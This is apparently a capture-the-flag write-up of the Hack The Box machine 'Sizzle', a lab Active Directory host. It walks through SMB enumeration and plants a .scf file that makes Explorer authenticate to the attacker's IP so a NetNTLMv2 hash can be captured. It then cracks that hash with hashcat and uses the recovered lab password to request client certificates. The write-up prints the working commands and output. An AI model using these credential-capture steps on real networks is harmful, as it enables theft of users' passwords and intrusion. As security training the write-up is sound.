---
title: HTB: Sizzle
url: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
date: 2019-06-01T13:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: hackthebox, htb-sizzle, ctf, nmap, gobuster, smbmap, smbclient, smb, ftp, regex, regex101, responder, scf, net-ntlmv2, hashcat, ldapdomaindump, ldap, certsrv, certificate, firefox, openssl, winrm, constrained-language-mode, psbypassclm, metasploit, meterpreter, installutil, msbuild, msfvenom, kerberoast, tunnel, rubeus, chisel, bloodhound, smbserver, dcsync, secretsdump, crackmapexec, wmiexec, cron, ntlm-http, burp, htb-active, htb-reel, certificate-authority, client-certificate, adcs, htb-giddy, htb-bighead, oscp-plus-v1, oscp-plus-v2, osep-plus
---

![Sizzle-cover](https://0xdfimages.gitlab.io/img/sizzle-cover.png)

I *loved* Sizzle. It was just a really tough box that reinforced Windows concepts that I hear about from pentesters in the real world. I’ll start with some SMB access, use a .scf file to capture a users NetNTLM hash, and crack it to get creds. From there I can create a certificate for the user and then authenticate over WinRM. I’ll Kerberoast to get a second user, who is able to run the DCSync attack, leading to an admin shell. I’ll have two beyond root sections, the first to show two unintended paths, and the second to exploit NTLM authentication over HTTP, and how Burp breaks it.

## Box Info

| Name | [Sizzle](https://hackthebox.com/machines/sizzle)  [Sizzle](https://hackthebox.com/machines/sizzle) [Play on HackTheBox](https://hackthebox.com/machines/sizzle) |
| --- | --- |
| Release Date | [12 Jan 2019](https://twitter.com/hackthebox_eu/status/1083642010232385536) |
| Retire Date | 25 May 2019 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Sizzle |
| Radar Graph | Radar chart for Sizzle |
| First Blood User | 17:59:56[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| First Blood Root | 18:37:15[stefano118 stefano118](https://app.hackthebox.com/users/3603) |
| Creators | [mrb3n mrb3n](https://app.hackthebox.com/users/2984)  [lkys37en lkys37en](https://app.hackthebox.com/users/709) |

## Recon

### nmap

`nmap` scan shows a Windows host without much of a firewall up:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.103
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-14 20:56 EST
Nmap scan report for 10.10.10.103
Host is up (0.018s latency).
Not shown: 65506 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49679/tcp open  unknown
49682/tcp open  unknown
49683/tcp open  unknown
49684/tcp open  unknown
49687/tcp open  unknown
49697/tcp open  unknown
49709/tcp open  unknown
53221/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

root@kali# nmap -sC -sV -p 21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -oA nmap/scripts 10.10.10.103
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-14 20:58 EST
Nmap scan report for 10.10.10.103
Host is up (0.020s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-01-15T01:53:09+00:00; -7m35s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-01-15T01:53:11+00:00; -7m34s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-01-15T01:53:10+00:00; -7m34s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-01-15T01:53:10+00:00; -7m34s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_ssl-date: 2019-01-15T01:53:10+00:00; -7m35s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=1/14%Time=5C3D3E4D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7m34s, deviation: 0s, median: -7m35s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-01-14 20:53:10
|_  start_date: 2019-01-13 18:56:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.10 seconds

```

The ports that jump out as most interesting are FTP (21), HTTP (80), LDAP (389), and SMB (445). I’ll also note WinRM on 5985/5986 as something I can use if I find creds.

### FTP - TCP 21

FTP allows anonymous logins, but the directory is empty.

```

root@kali# ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.

```

I’ll keep this in mind in case it’s useful later.

### Website - port 80

#### Site

The site just shows a gif of bacon sizzling:

![](https://0xdfimages.gitlab.io/img/sizzle.gif)

#### gobuster

Didn’t find anything interesting with `gobuster`. Ran similar searched on the https site as well.

```

root@kali# gobuster -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.103/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx,txt,html,asp
[+] Timeout      : 10s
=====================================================
2019/01/15 20:47:01 Starting gobuster
=====================================================
/images (Status: 301)
/index.html (Status: 200)
/Images (Status: 301)
/Index.html (Status: 200)
/IMAGES (Status: 301)
/INDEX.html (Status: 200)
=====================================================
2019/01/15 21:09:19 Finished
=====================================================

```

But, later I tried with an IIS focused list, and something else shows up:

```

root@kali# gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 50

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.103/
[+] Threads      : 50
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/01/24 14:12:36 Starting gobuster
=====================================================
//certenroll/ (Status: 403)
=====================================================
2019/01/24 14:12:36 Finished
=====================================================

```

### LDAP - TCP 389

All my attempts to get information out of LDAP without any authentication failed. I’ll need to revisit with user creds and try again.

### SMB - TCP 445

#### List Shares

`smbmap` doesn’t show anything useful:

```

root@kali# smbmap -H 10.10.10.103
[+] Finding open SMB ports....                                  
[+] User SMB session establishd on 10.10.10.103...                     
[+] IP: 10.10.10.103:445        Name: 10.10.10.103             
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied

```

Because I’ve been burned enumerating SMB before, I’ll double check with `smbclient`, and I get a list of shares:

```

root@kali# smbclient -N -L \\\\10.10.10.103
           
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin                                    
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk    
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share              
        Operations      Disk                                     
        SYSVOL          Disk      Logon server share           
Reconnecting with SMB1 for workgroup listing.                      
Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available  

```

#### Check Access

For each share, I’d like to know which allow access with null authentication. When I try to connect to SYSVOL it lets me connect, but then doesn’t let me ever run `dir`.

```

root@kali# smbclient -N //10.10.10.103/SYSVOL
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*

```

I get the same behavior for the next share, Operations. I’ll write a loop to test these. First I’ll `grep` on “Disk” to get just the lines with the shares (I don’t mind missing the IPC share here). Then I’ll use `sed` to match on the entire line, selecting the share name, and then replace it with the share group selection:

```

root@kali# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/'
ADMIN$          
C$              
CertEnroll      
Department Shares 
NETLOGON        
Operations      
SYSVOL

```

If that regex is scary, check out [regex101](https://regex101.com/r/Z7fLRL/2) (that link will load this example). You can paste in your data and build your regex and it will update with colored blocks showing what matches. There’s also a neat reference panel to look up things like “what’s the pattern to match any whitespace character?” (The answer is `\s`.)

![](https://0xdfimages.gitlab.io/img/sizzle-regex101.gif)

I’ll use `sed` to match that regex, and then replace with `\1`, which is the first match (`whatevers in the first set of` ()`). So I replace the entire line with just the sharename.

Now, it’s just a manner of looping over those shares, trying to connect, and seeing if i can do a `dir`:

```

root@kali# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//10.10.10.103/${share}" -c dir; echo; done
======ADMIN$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======C$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======CertEnroll======
NT_STATUS_ACCESS_DENIED listing \*

======Department Shares======
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Tue Jan 15 04:10:39 2019

                7779839 blocks of size 4096. 3211943 blocks available

======NETLOGON======
NT_STATUS_ACCESS_DENIED listing \*

======Operations======
NT_STATUS_ACCESS_DENIED listing \*

======SYSVOL======
NT_STATUS_ACCESS_DENIED listing \*

```

So there’s only one share I can access at this point in a meaningful way.

#### Mount Share

I’ll mount the share so I can easily access it:

```

root@kali# mount -t cifs "//10.10.10.103/Department Shares" /mnt
Password for root@//10.10.10.103/Department Shares:
root@kali:/mnt# ls
 Accounting   Audit   Banking   CEO_protected   Devops   Finance   HR   Infosec   Infrastructure   IT   Legal  'M&A'   Marketing  'R&D'   Sales   Security   Tax   Users   ZZ_ARCHIVE

```

#### Enumeration

There’s a bunch of empty directories. In fact, only one directory has files:

```

root@kali:/mnt/ZZ_ARCHIVE# ls                                      
AddComplete.pptx       DebugMove.mpg          EditMount.doc    ExitEnter.mpg     JoinEnable.ram      NewInitialize.doc    RequestJoin.mpeg2    SuspendWatch.mp4       UpdateRead.mpeg                             
AddMerge.ram           DebugSelect.mpg        EditSuspend.mp3  ExportEdit.ogg    LimitInstall.doc    OutConnect.mpeg2     RequestOpen.ogg      SwitchConvertFrom.mpg  WaitRevoke.pptx
ConfirmUnprotect.doc   DebugUse.pptx          EnableAdd.pptx   GetOptimize.pdf   LimitStep.ppt       PingGet.dot          ResetCompare.avi     UndoPing.rm            WriteUninstall.mp3
ConvertFromInvoke.mov  DisconnectApprove.ogg  EnablePing.mov   GroupSend.rm      MergeBlock.mp3      ReceiveInvoke.mpeg2  ResetUninstall.mpeg  UninstallExpand.mp3                                                
ConvertJoin.docx       DisconnectDebug.mpeg2  EnableSend.ppt   HideExpand.rm     MountClear.mpeg2    RemoveEnter.mpeg3    ResumeCompare.doc    UnpublishSplit.ppt
CopyPublish.ogg        EditCompress.xls       EnterMerge.mpeg  InstallWait.pptx  MoveUninstall.docx  RemoveRestart.mpeg   SelectPop.ogg        UnregisterPing.pptx

```

And all these files are just filled with nulls:

```

root@kali:/mnt/ZZ_ARCHIVE# cat AddComplete.pptx | xxd                                                    
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................                       
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
...[snip]...

root@kali:/mnt/ZZ_ARCHIVE# cat * | xxd | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"
01466650: 0000 

```

There’s a users directory:

```

root@kali:/mnt/Users# ls
amanda  amanda_adm  bill  bob  chris  henry  joe  jose  lkys37en  morgan  mrb3n  Public

```

I can’t see any files in there, but this does give me a list of usernames.

#### Check for Write

I’ll run a check to see if I can write anywhere. I’ll run it as a one-liner, but here’s the bash with some whitespace for readability:

```

find . -type d | while read directory; do 
    touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; 
    mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/0xdf; 
done

```

`find . -type d` will list all the directories in the current directory. So for each directory, I’ll try to write a file in it. If that returns true (it writes), I’ll echo the dir name and then remove the file. I’ll do that same again but this time making a directory. I find two dirs I can write in:

```

root@kali:/mnt# find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done
./Users/Public - write file
./Users/Public - write directory
./ZZ_ARCHIVE - write file
./ZZ_ARCHIVE - write directory

```

#### Files Deleted

I wanted to test what kinds of files I might be able to write. So I created a bunch of different files on the system in the two places I could write:

```

root@kali:/mnt/Users/Public# touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}

root@kali:/mnt/Users/Public# ls
0xdf  0xdf.dll  0xdf.exe  0xdf.ini  0xdf.lnk

root@kali:/mnt/Users/Public# ls /mnt/ZZ_ARCHIVE/0xdf.*
/mnt/ZZ_ARCHIVE/0xdf.dll  /mnt/ZZ_ARCHIVE/0xdf.exe  /mnt/ZZ_ARCHIVE/0xdf.ini  /mnt/ZZ_ARCHIVE/0xdf.lnk

```

It looks like they all write, which is to say, nothing is blocking based on file name. But then something surprised me. I went back a bit later, and the files in Public were gone. I set up the test again, and this time used `watch -d "ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/0xdf*"` to monitor. `watch` will run the command you give it periodically (every two seconds by default) and `-d` has it highlight any changes on the screen. It turns out that the files are cleared every 4 minutes:

![](https://0xdfimages.gitlab.io/img/sizzle-public-delete.gif)

## Creds for Amanda

### Strategy

Now that I know there’s some kind of user interaction on this host, a bunch more ideas for attack vectors come to mind. [This paper](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf) outlines how Windows Explorer Shell Command files (`.scf`) can be used to get Windows to open an SMB connection whenever a user visits a directory containing the file. A `.scf` is a text file that can include an icon path that can be remote. `.lnk` files used to have the same issue, but this was [patched in August 2010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-046) after Stuxnet was seen in the wild abusing `.lnk` files

For Sizzle, I will drop a `.scf` file with a link location on my host, and use responder to capture the NTLMv2 hash. For more information on responder and NetNTLMv2, check out [my post on responder](/2019/01/13/getting-net-ntlm-hases-from-windows.html), which was released just around the time Sizzle was released (though I hadn’t done Sizzle yet). Here’s [another reference](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) for methods to capture NetNTLMv2, which includes `.scf` files.

### Get NetNTLMv2

I’ll drop the following file into the Public folder:

```

root@kali:/mnt/Users/Public# cat 0xdf.scf 
[Shell]
Command=2

IconFile=\\10.10.14.4\icon

```

When `Explorer` enters this directory, it will attempt to fetch the icon file from my host and authenticate. I’ll have `responder` running to capture that authentication. A minute later, I get a NetNTLMv2 on `responder`:

```

[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
[SMBv2] NTLMv2-SSP Username : HTB\amanda
[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:ee1fd9c7201c2a31:F4FD2428AB3107D72E46472A28ADD345:0101000000000000C0653150DE09D2017B51A16FDF651C2D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000AACD5ACB75C0E2B759DD79265572393CA79CF1AD76837FDD836686E2DC5F78BD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003500000000000000000000000000

```

### Crack NetNTLMv2

Now I’ll head over to `hashcat` to crack this. It breaks in 9 seconds to ‘Ashare1972’:

```

$ hashcat -m 5600 amanda-ntlmv2 /usr/share/wordlists/rockyou.txt --force
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz, 8192/29068 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...[snip]...
AMANDA::HTB:ee1fd9c7201c2a31:f4fd2428ab3107d72e46472a28add345:0101000000000000c0653150de09d2017b51a16fdf651c2d000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000100000000200000aacd5acb75c0e2b759dd79265572393ca79cf1ad76837fdd836686e2dc5f78bd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000:Ashare1972
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: AMANDA::HTB:ee1fd9c7201c2a31:f4fd2428ab3107d72e4647...000000
Time.Started.....: Wed Jan 16 14:18:23 2019 (8 secs)
Time.Estimated...: Wed Jan 16 14:18:31 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1442.9 kH/s (5.14ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 11419648/14344385 (79.61%)
Rejected.........: 0/11419648 (0.00%)
Restore.Point....: 11411456/14344385 (79.55%)
Candidates.#1....: AznG13 -> ApRiL197630
HWMon.Dev.#1.....: N/A

Started: Wed Jan 16 14:18:23 2019
Stopped: Wed Jan 16 14:18:32 2019

```

## Enumeration as amanda

### Shell over WinRM - Fail

With creds for amanda and WinRM open, I tried to connect using [Alamot’s WinRM shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) just as I did in [Giddy](/2019/02/16/htb-giddy.html#winrm-directly), but it fails with an authentication error, for both http and https.

### Share Access

Now that I have creds, I’ll re-run `smbmap` with creds, and see that I have access to a bunch more:

```

root@kali# smbmap -H 10.10.10.103 -u amanda -p Ashare1972
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.103...
[+] IP: 10.10.10.103:445        Name: 10.10.10.103
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        CertEnroll                                              READ ONLY
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY
        NETLOGON                                                READ ONLY
        Operations                                              NO ACCESS
        SYSVOL                                                  READ ONLY

```

CertEnroll is interesting, but nothing that’s immediately useful:

```

root@kali# mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt
root@kali# ls -l mnt/
total 13
-rwxr-xr-x 1 root root 721 Jan 23 18:55 HTB-SIZZLE-CA+.crl
-rwxr-xr-x 1 root root 909 Jan 20 18:55 HTB-SIZZLE-CA.crl
-rwxr-xr-x 1 root root 322 Jul  2  2018 nsrev_HTB-SIZZLE-CA.asp
-rwxr-xr-x 1 root root 871 Jul  2  2018 sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt

```

### LDAP

I can also use these creds to get more ldap information:

```

root@kali# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/hackthebox/sizzle-10.10.10.103/ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

root@kali# ls ~/hackthebox/sizzle-10.10.10.103/ldap/
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

root@kali# firefox ~/hackthebox/sizzle-10.10.10.103/ldap/domain_users.html 

root@kali# firefox ~/hackthebox/sizzle-10.10.10.103/ldap/domain_computers.html 

```

![1548799410133](https://0xdfimages.gitlab.io/img/1548799410133.png)

![1548799591903](https://0xdfimages.gitlab.io/img/1548799591903.png)

## Shell as amanda

### Accessing /certsrv

#### Find It

In my web enumeration, I found `/certenroll`, but that seems to be a dead end. In googling about this, I see it’s part of the [Certificate Enrollment Web Services in Active Directory Certificate Services](https://social.technet.microsoft.com/wiki/contents/articles/7734.certificate-enrollment-web-services-in-active-directory-certificate-services.aspx), which also fits with the files I was looking at in the share. I also see `/certsrv` as a primary end point for this service. If I try it in a browser, I’m prompted to log in:

![1548847401828](https://0xdfimages.gitlab.io/img/1548847401828.png)

#### Why Did gobuster Fail?

Why did this not come back in `gobuster`? Well, if I look in Burp, I’ll see in the response headers that what comes back for this path is a 401 Unauthorized:

```

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Wed, 30 Jan 2019 11:24:24 GMT
Connection: close
Content-Length: 1293

```

By default, `gobuster` only returns on 200,204,301,302,307,403. If I add 401, it finds it:

```

root@kali# gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.103/
[+] Threads      : 20
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
[+] Status codes : 200,204,301,302,307,401,403
[+] Timeout      : 10s
=====================================================
2019/01/30 05:58:48 Starting gobuster
=====================================================
//certsrv/ (Status: 401)
//certenroll/ (Status: 403)
=====================================================
2019/01/30 05:58:48 Finished
=====================================================

```

This is the second time recently that I’ve run into an instance where an unusual return code caused `gobuster` to miss something (similar to the [HTTP 418 in BigHead](/2019/05/04/htb-bighead.html#coffee)). Perhaps it’s time to move to `dirsearch.py`?

#### Logging In

amanda’s password, Ashare1972, gets me in to the `/certsrv/`, HTB-SIZZLE-CA:

![1548847468315](https://0xdfimages.gitlab.io/img/1548847468315.png)

I also will notice in the HTTP 401 response above that it’s asking for NTLM authentication. Burp will break NTLM authentication. That means that when I enter amanda / Ashare1972, it will just pop the auth prompt again as if I had entered bad creds. It sounds like this [is fixed in beta versions of Burp](https://support.portswigger.net/customer/portal/questions/17325400-ntlm-authentication-issues-in-1-7-33). I’ll figure out what’s breaking in [Beyond Root](#beyond-root---ntlm-auth).

### Generate Certificate and Key for amanda

This webpage will allow me to generate a certificate that I can use to authenticate as amanda. There are two ways to get the two files I need, a key (`.key`) and a certificate (`.crt` or `.cer`, they are [interchangeable](https://info.ssl.com/how-to-der-vs-crt-vs-cer-vs-pem-certificates-and-how-to-conver-them/)).

#### Load Into Browser and Export

I’ll click on the “Request a certificate” link in the page, and it will give me another page to request a type:

![1548848733659](https://0xdfimages.gitlab.io/img/1548848733659.png)

I’ll click “User Certificate”, and on the next screen, “Submit”:

![1548855426858](https://0xdfimages.gitlab.io/img/1548855426858.png)

Then it returns a page telling me it’s created my certificate:

![1548855469913](https://0xdfimages.gitlab.io/img/1548855469913.png)

When I click “Install this certificate”, Firefox pops an alert telling me that the certificate has been installed:

![1548855512233](https://0xdfimages.gitlab.io/img/1548855512233.png)

If I open the Firefox menu, go to “Preferences”, and search for “certificates” in the top right box, there’s a button to “View Certificates…”:

![1548855582924](https://0xdfimages.gitlab.io/img/1548855582924.png)

Clicking that opens the Certificate Manager, and in the “Your Certificates” tab, I’ll see I now have one for amanda:

![1548855659137](https://0xdfimages.gitlab.io/img/1548855659137.png)

I’ll click on that cert, and then hit “Backup…”, and save the file as `amanda.p12`. I can set a password if I want, but I’ll leave it empty. This file contains both the certificate and the key. I’ll next use `openssl` to create both those files from the `.p12`. I’ll need the password for the `.p12` if one is set, and `openssl` requires that the output key has a password of at least 4 characters.

```

root@kali# openssl pkcs12 -in amanda.p12 -nocerts -out amanda.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
root@kali# openssl pkcs12 -in amanda.p12 -clcerts -nokeys -out amanda.crt
Enter Import Password:

```

I now have both files I need:

```

root@kali# ls amanda.*
amanda.crt  amanda.key  amanda.p12

```

#### Submit Certificate Signing Request

Here, I’m going to create my own Certificate Signing Request (csr) and key, and then submit that CSR to the server, and it will give me back a certificate. First, I’ll use `openssl` to create the CSR and key:

```

root@kali# openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
Generating a RSA private key
.......................................................................................+++++
..............................................................................+++++
writing new private key to 'amanda.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
